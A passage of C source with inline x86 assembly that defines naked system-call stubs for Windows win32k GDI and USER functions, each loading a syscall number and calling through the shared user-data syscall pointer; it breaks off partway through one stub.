__declspec(naked) ULONG NTAPI NtGdiPolyPatBlt()
{
    __asm {
        mov eax, 000010EAh
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000014h
    }
}

__declspec(naked) ULONG NTAPI NtGdiPathToRegion()
{
    __asm {
        mov eax, 000010EBh
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000004h
    }
}

__declspec(naked) ULONG NTAPI NtGdiPlgBlt()
{
    __asm {
        mov eax, 000010ECh
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 0000002Ch
    }
}

__declspec(naked) ULONG NTAPI NtGdiPolyDraw()
{
    __asm {
        mov eax, 000010EDh
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000010h
    }
}

__declspec(naked) ULONG NTAPI NtGdiPolyPolyDraw()
{
    __asm {
        mov eax, 000010EEh
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000014h
    }
}

__declspec(naked) ULONG NTAPI NtGdiPolyTextOutW()
{
    __asm {
        mov eax, 000010EFh
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000010h
    }
}

__declspec(naked) ULONG NTAPI NtGdiPtInRegion()
{
    __asm {
        mov eax, 000010F0h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 0000000Ch
    }
}

__declspec(naked) ULONG NTAPI NtGdiPtVisible()
{
    __asm {
        mov eax, 000010F1h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 0000000Ch
    }
}

__declspec(naked) ULONG NTAPI NtGdiQueryFonts()
{
    __asm {
        mov eax, 000010F2h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 0000000Ch
    }
}

__declspec(naked) ULONG NTAPI NtGdiQueryFontAssocInfo()
{
    __asm {
        mov eax, 000010F3h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000004h
    }
}

__declspec(naked) ULONG NTAPI NtGdiRectangle()
{
    __asm {
        mov eax, 000010F4h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000014h
    }
}

__declspec(naked) ULONG NTAPI NtGdiRectInRegion()
{
    __asm {
        mov eax, 000010F5h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000008h
    }
}

__declspec(naked) ULONG NTAPI NtGdiRectVisible()
{
    __asm {
        mov eax, 000010F6h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000008h
    }
}

__declspec(naked) ULONG NTAPI NtGdiRemoveFontResourceW()
{
    __asm {
        mov eax, 000010F7h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000018h
    }
}

__declspec(naked) ULONG NTAPI NtGdiRemoveFontMemResourceEx()
{
    __asm {
        mov eax, 000010F8h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000004h
    }
}

__declspec(naked) ULONG NTAPI NtGdiResetDC()
{
    __asm {
        mov eax, 000010F9h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000014h
    }
}

__declspec(naked) ULONG NTAPI NtGdiResizePalette()
{
    __asm {
        mov eax, 000010FAh
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000008h
    }
}

__declspec(naked) ULONG NTAPI NtGdiRestoreDC()
{
    __asm {
        mov eax, 000010FBh
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000008h
    }
}

__declspec(naked) ULONG NTAPI NtGdiRoundRect()
{
    __asm {
        mov eax, 000010FCh
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 0000001Ch
    }
}

__declspec(naked) ULONG NTAPI NtGdiSaveDC()
{
    __asm {
        mov eax, 000010FDh
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000004h
    }
}

__declspec(naked) ULONG NTAPI NtGdiScaleViewportExtEx()
{
    __asm {
        mov eax, 000010FEh
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000018h
    }
}

__declspec(naked) ULONG NTAPI NtGdiScaleWindowExtEx()
{
    __asm {
        mov eax, 000010FFh
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000018h
    }
}

__declspec(naked) ULONG NTAPI NtGdiSelectBitmap()
{
    __asm {
        mov eax, 00001100h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000008h
    }
}

__declspec(naked) ULONG NTAPI NtGdiSelectBrush()
{
    __asm {
        mov eax, 00001101h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000008h
    }
}

__declspec(naked) ULONG NTAPI NtGdiSelectClipPath()
{
    __asm {
        mov eax, 00001102h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000008h
    }
}

__declspec(naked) ULONG NTAPI NtGdiSelectFont()
{
    __asm {
        mov eax, 00001103h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000008h
    }
}

__declspec(naked) ULONG NTAPI NtGdiSelectPen()
{
    __asm {
        mov eax, 00001104h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000008h
    }
}

__declspec(naked) ULONG NTAPI NtGdiSetBitmapAttributes()
{
    __asm {
        mov eax, 00001105h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000008h
    }
}

__declspec(naked) ULONG NTAPI NtGdiSetBitmapBits()
{
    __asm {
        mov eax, 00001106h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 0000000Ch
    }
}

__declspec(naked) ULONG NTAPI NtGdiSetBitmapDimension()
{
    __asm {
        mov eax, 00001107h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000010h
    }
}

__declspec(naked) ULONG NTAPI NtGdiSetBoundsRect()
{
    __asm {
        mov eax, 00001108h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 0000000Ch
    }
}

__declspec(naked) ULONG NTAPI NtGdiSetBrushAttributes()
{
    __asm {
        mov eax, 00001109h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000008h
    }
}

__declspec(naked) ULONG NTAPI NtGdiSetBrushOrg()
{
    __asm {
        mov eax, 0000110Ah
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000010h
    }
}

__declspec(naked) ULONG NTAPI NtGdiSetColorAdjustment()
{
    __asm {
        mov eax, 0000110Bh
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000008h
    }
}

__declspec(naked) ULONG NTAPI NtGdiSetColorSpace()
{
    __asm {
        mov eax, 0000110Ch
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000008h
    }
}

__declspec(naked) ULONG NTAPI NtGdiSetDeviceGammaRamp()
{
    __asm {
        mov eax, 0000110Dh
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000008h
    }
}

__declspec(naked) ULONG NTAPI NtGdiSetDIBitsToDeviceInternal()
{
    __asm {
        mov eax, 0000110Eh
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000040h
    }
}

__declspec(naked) ULONG NTAPI NtGdiSetFontEnumeration()
{
    __asm {
        mov eax, 0000110Fh
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000004h
    }
}

__declspec(naked) ULONG NTAPI NtGdiSetFontXform()
{
    __asm {
        mov eax, 00001110h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 0000000Ch
    }
}

__declspec(naked) ULONG NTAPI NtGdiSetIcmMode()
{
    __asm {
        mov eax, 00001111h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 0000000Ch
    }
}

__declspec(naked) ULONG NTAPI NtGdiSetLinkedUFIs()
{
    __asm {
        mov eax, 00001112h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 0000000Ch
    }
}

__declspec(naked) ULONG NTAPI NtGdiSetMagicColors()
{
    __asm {
        mov eax, 00001113h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 0000000Ch
    }
}

__declspec(naked) ULONG NTAPI NtGdiSetMetaRgn()
{
    __asm {
        mov eax, 00001114h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000004h
    }
}

__declspec(naked) ULONG NTAPI NtGdiSetMiterLimit()
{
    __asm {
        mov eax, 00001115h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 0000000Ch
    }
}

__declspec(naked) ULONG NTAPI NtGdiGetDeviceWidth()
{
    __asm {
        mov eax, 00001116h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000004h
    }
}

__declspec(naked) ULONG NTAPI NtGdiMirrorWindowOrg()
{
    __asm {
        mov eax, 00001117h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000004h
    }
}

__declspec(naked) ULONG NTAPI NtGdiSetLayout()
{
    __asm {
        mov eax, 00001118h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 0000000Ch
    }
}

__declspec(naked) ULONG NTAPI NtGdiSetPixel()
{
    __asm {
        mov eax, 00001119h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000010h
    }
}

__declspec(naked) ULONG NTAPI NtGdiSetPixelFormat()
{
    __asm {
        mov eax, 0000111Ah
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000008h
    }
}

__declspec(naked) ULONG NTAPI NtGdiSetRectRgn()
{
    __asm {
        mov eax, 0000111Bh
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000014h
    }
}

__declspec(naked) ULONG NTAPI NtGdiSetSystemPaletteUse()
{
    __asm {
        mov eax, 0000111Ch
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000008h
    }
}

__declspec(naked) ULONG NTAPI NtGdiSetTextJustification()
{
    __asm {
        mov eax, 0000111Dh
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 0000000Ch
    }
}

__declspec(naked) ULONG NTAPI NtGdiSetupPublicCFONT()
{
    __asm {
        mov eax, 0000111Eh
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 0000000Ch
    }
}

__declspec(naked) ULONG NTAPI NtGdiSetVirtualResolution()
{
    __asm {
        mov eax, 0000111Fh
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000014h
    }
}

__declspec(naked) ULONG NTAPI NtGdiSetSizeDevice()
{
    __asm {
        mov eax, 00001120h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 0000000Ch
    }
}

__declspec(naked) ULONG NTAPI NtGdiStartDoc()
{
    __asm {
        mov eax, 00001121h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000010h
    }
}

__declspec(naked) ULONG NTAPI NtGdiStartPage()
{
    __asm {
        mov eax, 00001122h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000004h
    }
}

__declspec(naked) ULONG NTAPI NtGdiStretchBlt()
{
    __asm {
        mov eax, 00001123h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000030h
    }
}

__declspec(naked) ULONG NTAPI NtGdiStretchDIBitsInternal()
{
    __asm {
        mov eax, 00001124h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000040h
    }
}

__declspec(naked) ULONG NTAPI NtGdiStrokeAndFillPath()
{
    __asm {
        mov eax, 00001125h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000004h
    }
}

__declspec(naked) ULONG NTAPI NtGdiStrokePath()
{
    __asm {
        mov eax, 00001126h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000004h
    }
}

__declspec(naked) ULONG NTAPI NtGdiSwapBuffers()
{
    __asm {
        mov eax, 00001127h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000004h
    }
}

__declspec(naked) ULONG NTAPI NtGdiTransformPoints()
{
    __asm {
        mov eax, 00001128h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000014h
    }
}

__declspec(naked) ULONG NTAPI NtGdiTransparentBlt()
{
    __asm {
        mov eax, 00001129h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 0000002Ch
    }
}

__declspec(naked) ULONG NTAPI NtGdiUnloadPrinterDriver()
{
    __asm {
        mov eax, 0000112Ah
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000008h
    }
}

__declspec(naked) ULONG NTAPI NtGdiUnmapMemFont()
{
    __asm {
        mov eax, 0000112Bh
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000004h
    }
}

__declspec(naked) ULONG NTAPI NtGdiUnrealizeObject()
{
    __asm {
        mov eax, 0000112Ch
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000004h
    }
}

__declspec(naked) ULONG NTAPI NtGdiUpdateColors()
{
    __asm {
        mov eax, 0000112Dh
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000004h
    }
}

__declspec(naked) ULONG NTAPI NtGdiWidenPath()
{
    __asm {
        mov eax, 0000112Eh
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000004h
    }
}

__declspec(naked) ULONG NTAPI NtUserActivateKeyboardLayout()
{
    __asm {
        mov eax, 0000112Fh
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000008h
    }
}

__declspec(naked) ULONG NTAPI NtUserAlterWindowStyle()
{
    __asm {
        mov eax, 00001130h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 0000000Ch
    }
}

__declspec(naked) ULONG NTAPI NtUserAssociateInputContext()
{
    __asm {
        mov eax, 00001131h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 0000000Ch
    }
}

__declspec(naked) ULONG NTAPI NtUserAttachThreadInput()
{
    __asm {
        mov eax, 00001132h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 0000000Ch
    }
}

__declspec(naked) ULONG NTAPI NtUserBeginPaint()
{
    __asm {
        mov eax, 00001133h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000008h
    }
}

__declspec(naked) ULONG NTAPI NtUserBitBltSysBmp()
{
    __asm {
        mov eax, 00001134h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000020h
    }
}

__declspec(naked) ULONG NTAPI NtUserBlockInput()
{
    __asm {
        mov eax, 00001135h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000004h
    }
}

__declspec(naked) ULONG NTAPI NtUserBuildHimcList()
{
    __asm {
        mov eax, 00001136h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000010h
    }
}

__declspec(naked) ULONG NTAPI NtUserBuildHwndList()
{
    __asm {
        mov eax, 00001137h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 0000001Ch
    }
}

__declspec(naked) ULONG NTAPI NtUserBuildNameList()
{
    __asm {
        mov eax, 00001138h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000010h
    }
}

__declspec(naked) ULONG NTAPI NtUserBuildPropList()
{
    __asm {
        mov eax, 00001139h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000010h
    }
}

__declspec(naked) ULONG NTAPI NtUserCallHwnd()
{
    __asm {
        mov eax, 0000113Ah
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000008h
    }
}

__declspec(naked) ULONG NTAPI NtUserCallHwndLock()
{
    __asm {
        mov eax, 0000113Bh
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000008h
    }
}

__declspec(naked) ULONG NTAPI NtUserCallHwndOpt()
{
    __asm {
        mov eax, 0000113Ch
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000008h
    }
}

__declspec(naked) ULONG NTAPI NtUserCallHwndParam()
{
    __asm {
        mov eax, 0000113Dh
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 0000000Ch
    }
}

__declspec(naked) ULONG NTAPI NtUserCallHwndParamLock()
{
    __asm {
        mov eax, 0000113Eh
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 0000000Ch
    }
}

__declspec(naked) ULONG NTAPI NtUserCallMsgFilter()
{
    __asm {
        mov eax, 0000113Fh
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000008h
    }
}

__declspec(naked) ULONG NTAPI NtUserCallNextHookEx()
{
    __asm {
        mov eax, 00001140h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000010h
    }
}

__declspec(naked) ULONG NTAPI NtUserCallNoParam()
{
    __asm {
        mov eax, 00001141h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000004h
    }
}

__declspec(naked) ULONG NTAPI NtUserCallOneParam()
{
    __asm {
        mov eax, 00001142h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000008h
    }
}

__declspec(naked) ULONG NTAPI NtUserCallTwoParam()
{
    __asm {
        mov eax, 00001143h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 0000000Ch
    }
}

__declspec(naked) ULONG NTAPI NtUserChangeClipboardChain()
{
    __asm {
        mov eax, 00001144h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000008h
    }
}

__declspec(naked) ULONG NTAPI NtUserChangeDisplaySettings()
{
    __asm {
        mov eax, 00001145h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000010h
    }
}

__declspec(naked) ULONG NTAPI NtUserCheckImeHotKey()
{
    __asm {
        mov eax, 00001146h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000008h
    }
}

__declspec(naked) ULONG NTAPI NtUserCheckMenuItem()
{
    __asm {
        mov eax, 00001147h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 0000000Ch
    }
}

__declspec(naked) ULONG NTAPI NtUserChildWindowFromPointEx()
{
    __asm {
        mov eax, 00001148h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000010h
    }
}

__declspec(naked) ULONG NTAPI NtUserClipCursor()
{
    __asm {
        mov eax, 00001149h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000004h
    }
}

__declspec(naked) ULONG NTAPI NtUserCloseClipboard()
{
    __asm {
        mov eax, 0000114Ah
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000000h
    }
}

__declspec(naked) ULONG NTAPI NtUserCloseDesktop()
{
    __asm {
        mov eax, 0000114Bh
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000004h
    }
}

__declspec(naked) ULONG NTAPI NtUserCloseWindowStation()
{
    __asm {
        mov eax, 0000114Ch
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000004h
    }
}

__declspec(naked) ULONG NTAPI NtUserConsoleControl()
{
    __asm {
        mov eax, 0000114Dh
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 0000000Ch
    }
}

__declspec(naked) ULONG NTAPI NtUserConvertMemHandle()
{
    __asm {
        mov eax, 0000114Eh
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000008h
    }
}

__declspec(naked) ULONG NTAPI NtUserCopyAcceleratorTable()
{
    __asm {
        mov eax, 0000114Fh
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 0000000Ch
    }
}

__declspec(naked) ULONG NTAPI NtUserCountClipboardFormats()
{
    __asm {
        mov eax, 00001150h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000000h
    }
}

__declspec(naked) ULONG NTAPI NtUserCreateAcceleratorTable()
{
    __asm {
        mov eax, 00001151h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000008h
    }
}

__declspec(naked) ULONG NTAPI NtUserCreateCaret()
{
    __asm {
        mov eax, 00001152h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000010h
    }
}

__declspec(naked) ULONG NTAPI NtUserCreateDesktop()
{
    __asm {
        mov eax, 00001153h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000014h
    }
}

__declspec(naked) ULONG NTAPI NtUserCreateInputContext()
{
    __asm {
        mov eax, 00001154h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000004h
    }
}

__declspec(naked) ULONG NTAPI NtUserCreateLocalMemHandle()
{
    __asm {
        mov eax, 00001155h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000010h
    }
}

__declspec(naked) ULONG NTAPI NtUserCreateWindowEx()
{
    __asm {
        mov eax, 00001156h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 0000003Ch
    }
}

__declspec(naked) ULONG NTAPI NtUserCreateWindowStation()
{
    __asm {
        mov eax, 00001157h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 0000001Ch
    }
}

__declspec(naked) ULONG NTAPI NtUserDdeGetQualityOfService()
{
    __asm {
        mov eax, 00001158h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 0000000Ch
    }
}

__declspec(naked) ULONG NTAPI NtUserDdeInitialize()
{
    __asm {
        mov eax, 00001159h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000014h
    }
}

__declspec(naked) ULONG NTAPI NtUserDdeSetQualityOfService()
{
    __asm {
        mov eax, 0000115Ah
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 0000000Ch
    }
}

__declspec(naked) ULONG NTAPI NtUserDeferWindowPos()
{
    __asm {
        mov eax, 0000115Bh
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000020h
    }
}

__declspec(naked) ULONG NTAPI NtUserDefSetText()
{
    __asm {
        mov eax, 0000115Ch
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000008h
    }
}

__declspec(naked) ULONG NTAPI NtUserDeleteMenu()
{
    __asm {
        mov eax, 0000115Dh
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 0000000Ch
    }
}

__declspec(naked) ULONG NTAPI NtUserDestroyAcceleratorTable()
{
    __asm {
        mov eax, 0000115Eh
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000004h
    }
}

__declspec(naked) ULONG NTAPI NtUserDestroyCursor()
{
    __asm {
        mov eax, 0000115Fh
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000008h
    }
}

__declspec(naked) ULONG NTAPI NtUserDestroyInputContext()
{
    __asm {
        mov eax, 00001160h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000004h
    }
}

__declspec(naked) ULONG NTAPI NtUserDestroyMenu()
{
    __asm {
        mov eax, 00001161h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000004h
    }
}

__declspec(naked) ULONG NTAPI NtUserDestroyWindow()
{
    __asm {
        mov eax, 00001162h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000004h
    }
}

__declspec(naked) ULONG NTAPI NtUserDisableThreadIme()
{
    __asm {
        mov eax, 00001163h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000004h
    }
}

__declspec(naked) ULONG NTAPI NtUserDispatchMessage()
{
    __asm {
        mov eax, 00001164h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000004h
    }
}

__declspec(naked) ULONG NTAPI NtUserDragDetect()
{
    __asm {
        mov eax, 00001165h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 0000000Ch
    }
}

__declspec(naked) ULONG NTAPI NtUserDragObject()
{
    __asm {
        mov eax, 00001166h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000014h
    }
}

__declspec(naked) ULONG NTAPI NtUserDrawAnimatedRects()
{
    __asm {
        mov eax, 00001167h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000010h
    }
}

__declspec(naked) ULONG NTAPI NtUserDrawCaption()
{
    __asm {
        mov eax, 00001168h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000010h
    }
}

__declspec(naked) ULONG NTAPI NtUserDrawCaptionTemp()
{
    __asm {
        mov eax, 00001169h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 0000001Ch
    }
}

__declspec(naked) ULONG NTAPI NtUserDrawIconEx()
{
    __asm {
        mov eax, 0000116Ah
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 0000002Ch
    }
}

__declspec(naked) ULONG NTAPI NtUserDrawMenuBarTemp()
{
    __asm {
        mov eax, 0000116Bh
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000014h
    }
}

__declspec(naked) ULONG NTAPI NtUserEmptyClipboard()
{
    __asm {
        mov eax, 0000116Ch
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000000h
    }
}

__declspec(naked) ULONG NTAPI NtUserEnableMenuItem()
{
    __asm {
        mov eax, 0000116Dh
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 0000000Ch
    }
}

__declspec(naked) ULONG NTAPI NtUserEnableScrollBar()
{
    __asm {
        mov eax, 0000116Eh
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 0000000Ch
    }
}

__declspec(naked) ULONG NTAPI NtUserEndDeferWindowPosEx()
{
    __asm {
        mov eax, 0000116Fh
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000008h
    }
}

__declspec(naked) ULONG NTAPI NtUserEndMenu()
{
    __asm {
        mov eax, 00001170h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000000h
    }
}

__declspec(naked) ULONG NTAPI NtUserEndPaint()
{
    __asm {
        mov eax, 00001171h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000008h
    }
}

__declspec(naked) ULONG NTAPI NtUserEnumDisplayDevices()
{
    __asm {
        mov eax, 00001172h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000010h
    }
}

__declspec(naked) ULONG NTAPI NtUserEnumDisplayMonitors()
{
    __asm {
        mov eax, 00001173h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000014h
    }
}

__declspec(naked) ULONG NTAPI NtUserEnumDisplaySettings()
{
    __asm {
        mov eax, 00001174h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000010h
    }
}

__declspec(naked) ULONG NTAPI NtUserEvent()
{
    __asm {
        mov eax, 00001175h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000004h
    }
}

__declspec(naked) ULONG NTAPI NtUserExcludeUpdateRgn()
{
    __asm {
        mov eax, 00001176h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000008h
    }
}

__declspec(naked) ULONG NTAPI NtUserFillWindow()
{
    __asm {
        mov eax, 00001177h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000010h
    }
}

__declspec(naked) ULONG NTAPI NtUserFindExistingCursorIcon()
{
    __asm {
        mov eax, 00001178h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 0000000Ch
    }
}

__declspec(naked) ULONG NTAPI NtUserFindWindowEx()
{
    __asm {
        mov eax, 00001179h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000014h
    }
}

__declspec(naked) ULONG NTAPI NtUserFlashWindowEx()
{
    __asm {
        mov eax, 0000117Ah
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000004h
    }
}

__declspec(naked) ULONG NTAPI NtUserGetAltTabInfo()
{
    __asm {
        mov eax, 0000117Bh
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000018h
    }
}

__declspec(naked) ULONG NTAPI NtUserGetAncestor()
{
    __asm {
        mov eax, 0000117Ch
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000008h
    }
}

__declspec(naked) ULONG NTAPI NtUserGetAppImeLevel()
{
    __asm {
        mov eax, 0000117Dh
        mov edx, KUSER_SHARED_SYSCALL
